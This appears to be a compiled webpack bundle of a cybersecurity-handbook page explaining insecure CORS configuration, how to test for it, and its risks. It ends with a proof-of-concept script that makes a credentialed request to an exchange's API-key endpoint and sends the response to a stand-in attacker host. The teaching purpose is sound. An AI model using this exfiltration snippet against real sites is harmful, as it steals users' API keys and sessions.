"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[22],{616:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>t,default:()=>u,frontMatter:()=>o,metadata:()=>c,toc:()=>l});var i=s(5893),r=s(1151);const o={},t="CORS Insecure Configuration",c={id:"vulnerabilities/web/cors-insecure/README",title:"CORS Insecure Configuration",description:"CORS is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the resource originated. It's essentialy a way to relax SOP which would block AJAX requests from accesing data on a web page unless it is coming from the same origin.",source:"@site/docs/vulnerabilities/web/cors-insecure/README.md",sourceDirName:"vulnerabilities/web/cors-insecure",slug:"/vulnerabilities/web/cors-insecure/",permalink:"/cybersecurity-handbook/vulnerabilities/web/cors-insecure/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Cookie Tampering",permalink:"/cybersecurity-handbook/vulnerabilities/web/cookie-tampering/"},next:{title:"CSRF: Cross Site Request Forgery",permalink:"/cybersecurity-handbook/vulnerabilities/web/csrf/"}},a={},l=[{value:"Access-Control-Allow-Origin",id:"access-control-allow-origin",level:2},{value:"Exploitation",id:"exploitation",level:2},{value:"POC: Insecure Bitcoin Exchange",id:"poc-insecure-bitcoin-exchange",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"cors-insecure-configuration",children:"CORS Insecure Configuration"}),"\n",(0,i.jsx)(n.p,{children:"CORS is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the resource originated. It's essentialy a way to relax SOP which would block AJAX requests from accesing data on a web page unless it is coming from the same origin."}),"\n",(0,i.jsx)(n.h2,{id:"access-control-allow-origin",children:"Access-Control-Allow-Origin"}),"\n",(0,i.jsx)(n.p,{children:"CORS adds a few special response headers that allow which sites can access which data."}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"Access-Control-Allow-Origin"}),": which domains can access a domain's resources."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"Access-Control-Allow-Credentials"}),": whether the browser will send cookies with the request."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"Access-Control-Allow-Methods"}),": which HTTP methods can be used to access resources."]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Access-Control-Allow-Origin: * | null // BAD\nAccess-Control-Allow-Credentials: true // Poorly implemented, the best case for attack\nAccess-Control-Allow-Methods: * // BAD\n"})}),"\n",(0,i.jsxs)(n.p,{children:["It's easy to check headers in multiple request/responses using tools like Burp and Spider. You can simple add a new header in request body i.e ",(0,i.jsx)(n.code,{children:"Origin: http://mysite.com | null"})," and if you find ",(0,i.jsx)(n.code,{children:"Access-Control-Allow-Origin: mysite.com | null | *"})," then domain is vulnerable."]}),"\n",(0,i.jsx)(n.h2,{id:"exploitation",children:"Exploitation"}),"\n",(0,i.jsx)(n.p,{children:"We can make a request for resources with stored credentials for example, leak private resources, session hijacking, etc."}),"\n",(0,i.jsx)(n.p,{children:"CORS can lead to major security risk like leaking of API keys, other users data or even much more."}),"\n",(0,i.jsx)(n.h2,{id:"poc-insecure-bitcoin-exchange",children:"POC: Insecure Bitcoin Exchange"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-js",children:"var req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://btc-exchange/api/requestApiKey',true); \nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n    location='//atttacker.net/log?key='+this.responseText; \n};\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties",children:"Portswagger research"})}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>c,a:()=>t});var i=s(7294);const r={},o=i.createContext(r);function t(e){const n=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),i.createElement(o.Provider,{value:n},e.children)}}}]);